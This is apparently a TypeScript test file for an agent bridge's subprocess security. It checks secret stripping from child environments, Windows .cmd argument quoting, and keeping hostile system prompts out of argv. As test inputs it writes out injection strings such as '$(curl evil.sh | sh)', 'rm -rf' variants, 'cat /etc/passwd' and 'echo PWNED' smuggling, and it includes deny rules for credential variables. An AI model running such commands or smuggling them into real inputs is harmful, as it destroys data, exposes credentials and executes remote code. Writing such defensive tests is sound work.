import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'

import { buildWindowsCmdCommandLine, type ContextPacketV1 } from '@agentroom/shared'

import { ClaudeCodeAdapter } from '../src/adapters/claude-code-adapter.js'
import {
  BinaryNotFoundError,
  buildChildEnv,
  resolveBinaryPath,
  resolveSpawnTarget,
} from '../src/lib/subprocess-security.js'

class TestClaudeCodeAdapter extends ClaudeCodeAdapter {
  args(packet: ContextPacketV1) {
    return this.buildArgs(packet)
  }
  stdin(packet: ContextPacketV1) {
    return this.buildStdin(packet)
  }
}

function packetWith(systemPrompt: string | null): ContextPacketV1 {
  return {
    schema_version: 1,
    run_id: 'run-1',
    room: {
      id: 'room-1',
      name: 'Demo',
      reply_mode: 'everyone',
      max_agent_rounds: 3,
      discussion_mode: 'independent',
    },
    agent: {
      id: 'agent-1',
      name: 'Claude Thinker',
      slug: 'claude-thinker',
      system_prompt: systemPrompt,
      provider: 'claude_code',
    },
    trigger_message: {
      id: 'msg-2',
      content: 'Answer this now',
      sender_type: 'user',
      created_at: '2026-05-16T00:01:00.000Z',
    },
    recent_messages: [
      {
        id: 'msg-2',
        content: 'Answer this now',
        sender_type: 'user',
        sender_agent_id: null,
        created_at: '2026-05-16T00:01:00.000Z',
        metadata: {},
      },
    ],
    round_index: 1,
    discussion_mode: 'independent',
    deliberation_depth: 0,
    deliberation_root_id: null,
  }
}

// --- buildChildEnv ---

test('buildChildEnv strips secrets and forwards only allowlisted vars', () => {
  const env = buildChildEnv({
    PATH: '/usr/bin',
    HOME: '/home/agent',
    SUPABASE_SERVICE_ROLE_KEY: 'super-secret',
    SUPABASE_URL: 'https://x.supabase.co',
    SOME_SECRET: 'nope',
    GITHUB_TOKEN: 'ghp_xxx',
    ANTHROPIC_BASE_URL: 'https://proxy.example/v1',
    ANTHROPIC_API_KEY: 'sk-ant',
    OPENAI_API_KEY: 'sk-openai',
    RANDOM_APP_VAR: 'should-not-pass',
  })

  assert.equal(env['PATH'], '/usr/bin')
  assert.equal(env['HOME'], '/home/agent')
  // Provider CONFIG (endpoints, regions, model selectors) is still forwarded...
  assert.equal(env['ANTHROPIC_BASE_URL'], 'https://proxy.example/v1')
  // ...but a provider CREDENTIAL is not: `_KEY$` is denied before the allowlist, so a
  // host-wide key in the bridge's own env no longer reaches every spawned CLI (C3).
  assert.equal(env['ANTHROPIC_API_KEY'], undefined)
  assert.equal(env['OPENAI_API_KEY'], undefined)
  assert.equal(env['SUPABASE_SERVICE_ROLE_KEY'], undefined)
  assert.equal(env['SUPABASE_URL'], undefined)
  assert.equal(env['SOME_SECRET'], undefined)
  assert.equal(env['GITHUB_TOKEN'], undefined)
  assert.equal(env['RANDOM_APP_VAR'], undefined)
})

test('buildChildEnv honors BRIDGE_CHILD_ENV_ALLOW passthrough but never secrets', () => {
  const env = buildChildEnv({
    PATH: '/usr/bin',
    BRIDGE_CHILD_ENV_ALLOW: 'MY_CLI_HOME,RANDOM_APP_VAR',
    MY_CLI_HOME: '/opt/cli',
    RANDOM_APP_VAR: 'now-allowed',
    BRIDGE_SECRET_THING: 'must-stay-hidden',
  })

  assert.equal(env['MY_CLI_HOME'], '/opt/cli')
  assert.equal(env['RANDOM_APP_VAR'], 'now-allowed')
  // BRIDGE_* is a secret-pattern match and is stripped even though it is a var name.
  assert.equal(env['BRIDGE_SECRET_THING'], undefined)
})

// C3: the secret strip runs BEFORE the allowlist, so an operator cannot re-open a
// credential var by naming it in BRIDGE_CHILD_ENV_ALLOW — including the master key
// that decrypts every stored BYO credential.
test('buildChildEnv denies *_KEY and CREDENTIAL_* even when named in BRIDGE_CHILD_ENV_ALLOW', () => {
  const env = buildChildEnv({
    PATH: '/usr/bin',
    BRIDGE_CHILD_ENV_ALLOW:
      'MY_CLI_HOME,ANTHROPIC_API_KEY,SOME_VENDOR_KEY,CREDENTIAL_ENCRYPTION_KEY,CREDENTIAL_STORE_PATH',
    MY_CLI_HOME: '/opt/cli',
    ANTHROPIC_API_KEY: 'sk-ant-host-wide',
    SOME_VENDOR_KEY: 'vendor-secret',
    CREDENTIAL_ENCRYPTION_KEY: 'the-master-key',
    CREDENTIAL_STORE_PATH: '/var/credentials',
  })

  assert.equal(env['MY_CLI_HOME'], '/opt/cli', 'a non-secret allow entry still works')
  assert.equal(env['ANTHROPIC_API_KEY'], undefined)
  assert.equal(env['SOME_VENDOR_KEY'], undefined)
  assert.equal(env['CREDENTIAL_ENCRYPTION_KEY'], undefined)
  // ^CREDENTIAL_ denies the whole namespace, not just names ending in _KEY.
  assert.equal(env['CREDENTIAL_STORE_PATH'], undefined)
})

test('buildChildEnv denies *_KEY / CREDENTIAL_* case-insensitively on Windows', () => {
  const env = buildChildEnv(
    {
      bridge_child_env_allow: 'anthropic_api_key,Credential_Encryption_Key',
      anthropic_api_key: 'sk-ant-host-wide',
      Credential_Encryption_Key: 'the-master-key',
    },
    { platform: 'win32' },
  )

  assert.equal(env['anthropic_api_key'], undefined)
  assert.equal(env['Credential_Encryption_Key'], undefined)
})

test('buildChildEnv inject seam (ADR-0010): exactly one resolved credential var, secrets still stripped', () => {
  const env = buildChildEnv(
    {
      PATH: '/usr/bin',
      SUPABASE_SERVICE_ROLE_KEY: 'service-role-must-stay-hidden',
      SOME_API_SECRET: 'env-secret-must-stay-hidden',
      // A host-wide key with the SAME name the run wants to inject. It must be stripped
      // from the environment, and the injected per-run value must be what the child sees.
      OPENAI_API_KEY: 'sk-host-wide-must-stay-hidden',
    },
    { inject: { name: 'OPENAI_API_KEY', value: 'sk-resolved-byo-key' } },
  )
  // The resolved BYO credential is injected into exactly its one var — the `_KEY$` deny
  // applies to the environment scan, never to the inject seam, which runs after it.
  assert.equal(env['OPENAI_API_KEY'], 'sk-resolved-byo-key')
  // ...while process.env secrets are STILL stripped (injection doesn't widen the env).
  assert.equal(env['SUPABASE_SERVICE_ROLE_KEY'], undefined)
  assert.equal(env['SOME_API_SECRET'], undefined)
})

test('buildChildEnv inject is opt-in and name-validated (no injection by default / on bad name)', () => {
  // No inject → no extra var (a different adapter/run gets no leaked secret).
  const plain = buildChildEnv({ PATH: '/usr/bin' })
  assert.equal(plain['OPENAI_API_KEY'], undefined)
  // An invalid env name is ignored (fail-closed) — never injected as-is.
  const bad = buildChildEnv(
    { PATH: '/usr/bin' },
    { inject: { name: 'bad name; rm -rf', value: 'x' } },
  )
  assert.equal(bad['bad name; rm -rf'], undefined)
})

test('buildChildEnv matches allowlisted names case-insensitively on Windows only', () => {
  const source = {
    ComSpec: 'C:\\Windows\\System32\\cmd.exe',
    ProgramData: 'C:\\ProgramData',
    ProgramFiles: 'C:\\Program Files',
    'ProgramFiles(x86)': 'C:\\Program Files (x86)',
    some_secret: 'must-stay-hidden',
    random_app_var: 'must-stay-hidden',
  }

  const windowsEnv = buildChildEnv(source, { platform: 'win32' })
  assert.equal(windowsEnv['ComSpec'], 'C:\\Windows\\System32\\cmd.exe')
  assert.equal(windowsEnv['ProgramData'], 'C:\\ProgramData')
  assert.equal(windowsEnv['ProgramFiles'], 'C:\\Program Files')
  assert.equal(windowsEnv['ProgramFiles(x86)'], 'C:\\Program Files (x86)')
  assert.equal(windowsEnv['some_secret'], undefined)
  assert.equal(windowsEnv['random_app_var'], undefined)

  const posixEnv = buildChildEnv(source, { platform: 'linux' })
  assert.equal(posixEnv['ComSpec'], undefined)
  assert.equal(posixEnv['ProgramData'], undefined)
  assert.equal(posixEnv['ProgramFiles'], undefined)
  assert.equal(posixEnv['ProgramFiles(x86)'], undefined)
})

test('buildChildEnv honors Windows-cased extra allow names but still strips secrets first', () => {
  const env = buildChildEnv(
    {
      bridge_child_env_allow: 'MY_CLI_HOME,SOME_SECRET',
      my_cli_home: 'C:\\Users\\First Last\\.cli',
      some_secret: 'must-stay-hidden',
    },
    { platform: 'win32' },
  )

  assert.equal(env['my_cli_home'], 'C:\\Users\\First Last\\.cli')
  assert.equal(env['some_secret'], undefined)
  assert.equal(env['bridge_child_env_allow'], undefined)
})

// --- resolveBinaryPath ---

test('resolveBinaryPath resolves a bare command from PATH', () => {
  // node itself is guaranteed to be on PATH in the test runner.
  const resolved = resolveBinaryPath(process.platform === 'win32' ? 'node' : 'node')
  assert.ok(resolved.length > 0)
  assert.match(resolved, /node/i)
})

test('resolveBinaryPath throws BinaryNotFoundError for a missing command', () => {
  assert.throws(
    () => resolveBinaryPath('definitely-not-a-real-binary-xyz-123'),
    BinaryNotFoundError,
  )
})

test('resolveBinaryPath rejects a non-existent absolute path', () => {
  const bogus = process.platform === 'win32' ? 'C:\\nope\\bogus.exe' : '/nope/bogus'
  assert.throws(() => resolveBinaryPath(bogus), BinaryNotFoundError)
})

// --- resolveSpawnTarget ---

test('resolveSpawnTarget spawns a plain binary directly', () => {
  const t = resolveSpawnTarget('/usr/local/bin/claude', ['--print'], 'linux')
  assert.deepEqual(t, { command: '/usr/local/bin/claude', args: ['--print'] })
})

test('resolveSpawnTarget routes a Windows .cmd shim through cmd.exe with static args', () => {
  const t = resolveSpawnTarget(
    'C:\\bin\\claude.cmd',
    ['--print', '--output-format', 'json'],
    'win32',
    { COMSPEC: 'C:\\Windows\\System32\\cmd.exe' },
  )
  assert.equal(t.command, 'C:\\Windows\\System32\\cmd.exe')
  assert.deepEqual(t.args, [
    '/d',
    '/s',
    '/c',
    'C:\\bin\\claude.cmd',
    '--print',
    '--output-format',
    'json',
  ])
})

test('buildWindowsCmdCommandLine quotes .cmd paths with spaces and escapes shell metachars', () => {
  const commandLine = buildWindowsCmdCommandLine(
    'C:\\Users\\First Last\\AppData\\Roaming\\npm\\claude.cmd',
    ['--print', 'a&b', 'x|y', 'quote" & echo PWNED & "tail', '100%PATH%'],
  )

  assert.equal(
    commandLine,
    String.raw`"C:\Users\First^ Last\AppData\Roaming\npm\claude.cmd ^^^"--print^^^" ^^^"a^^^&b^^^" ^^^"x^^^|y^^^" ^^^"quote\^^^"^^^ ^^^&^^^ echo^^^ PWNED^^^ ^^^&^^^ \^^^"tail^^^" ^^^"100^^^%PATH^^^%^^^""`,
  )
})

test('resolveSpawnTarget prequotes Windows .cmd shims when cmd /s would strip path quotes', () => {
  const binPath = 'C:\\Users\\First Last\\AppData\\Roaming\\npm\\claude.cmd'
  const args = ['--print', 'a&b']
  const t = resolveSpawnTarget(binPath, args, 'win32', {
    COMSPEC: 'C:\\Windows\\System32\\cmd.exe',
  })

  assert.equal(t.command, 'C:\\Windows\\System32\\cmd.exe')
  assert.deepEqual(t.args, ['/d', '/s', '/c', buildWindowsCmdCommandLine(binPath, args)])
  assert.equal(t.windowsVerbatimArguments, true)
})

test(
  'Windows: spawned .cmd shim under a path with spaces preserves literal args',
  { skip: process.platform === 'win32' ? false : 'Windows-only .cmd integration' },
  () => {
    const dir = mkdtempSync(join(tmpdir(), 'agentroom shim space '))
    const script = join(dir, 'print-args.cjs')
    const shim = join(dir, 'print args.cmd')
    writeFileSync(script, 'process.stdout.write(JSON.stringify(process.argv.slice(2)))\n')
    writeFileSync(shim, '@echo off\r\nnode "%~dp0print-args.cjs" %*\r\n')

    // The trailing cases carry runs of >=2 backslashes — the shapes the old
    // atomic-lookahead escaper under-doubled, which merged adjacent arguments.
    const args = [
      '--print',
      'a&b',
      'x|y',
      'quote" & echo PWNED & "tail',
      '100%PATH%',
      'a\\\\"b',
      'x\\\\',
      'C:\\a\\b\\\\',
    ]
    const target = resolveSpawnTarget(shim, args, 'win32')
    const result = spawnSync(target.command, target.args, {
      encoding: 'utf8',
      shell: false,
      windowsHide: true,
      windowsVerbatimArguments: target.windowsVerbatimArguments === true,
    })

    assert.equal(result.status, 0, result.stderr)
    assert.deepEqual(JSON.parse(result.stdout), args)
    assert.doesNotMatch(result.stdout + result.stderr, /^PWNED$/m)
  },
)

// --- argv injection regression ---

test('claude adapter never puts system_prompt in argv', () => {
  const adapter = new TestClaudeCodeAdapter()
  const malicious = '"; rm -rf / #'
  const args = adapter.args(packetWith(malicious))
  assert.deepEqual(args, ['--print', '--output-format', 'json'])
  assert.ok(!args.some((a) => a.includes('rm -rf')))
})

test('claude adapter delivers system_prompt via stdin instead', () => {
  const adapter = new TestClaudeCodeAdapter()
  const stdin = adapter.stdin(packetWith('You are a helpful pirate.'))
  assert.match(stdin, /System instructions defining your persona/)
  assert.match(stdin, /helpful pirate/)
})

test('claude adapter omits the system section when no system_prompt is set', () => {
  const adapter = new TestClaudeCodeAdapter()
  const stdin = adapter.stdin(packetWith(null))
  assert.doesNotMatch(stdin, /System instructions defining your persona/)
  assert.match(stdin, /You are Claude Thinker/)
})

// Phase 11 hard gate: a *user-created* agent's system_prompt is fully
// attacker-controlled. It must reach the CLI only via stdin (data), never as an
// argv flag where shell metacharacters could be interpreted. buildArgs stays
// static regardless of how hostile the system_prompt is.
test('user-created agent system_prompt with shell metachars never reaches argv', () => {
  const adapter = new TestClaudeCodeAdapter()
  const hostile = [
    '$(curl evil.sh | sh)',
    '`rm -rf ~`',
    '"; cat /etc/passwd #',
    "' || shutdown -h now",
    '--dangerously-skip-permissions',
  ].join(' ')

  const args = adapter.args(packetWith(hostile))
  assert.deepEqual(args, ['--print', '--output-format', 'json'])
  for (const arg of args) {
    assert.ok(!arg.includes('curl'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('rm -rf'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('shutdown'), `argv leaked system_prompt: ${arg}`)
    assert.ok(!arg.includes('skip-permissions'), `argv leaked an injected flag: ${arg}`)
  }

  // It is present in stdin (as the persona section) — delivered as data.
  const stdin = adapter.stdin(packetWith(hostile))
  assert.match(stdin, /System instructions defining your persona/)
  assert.ok(stdin.includes('curl evil.sh'))
})
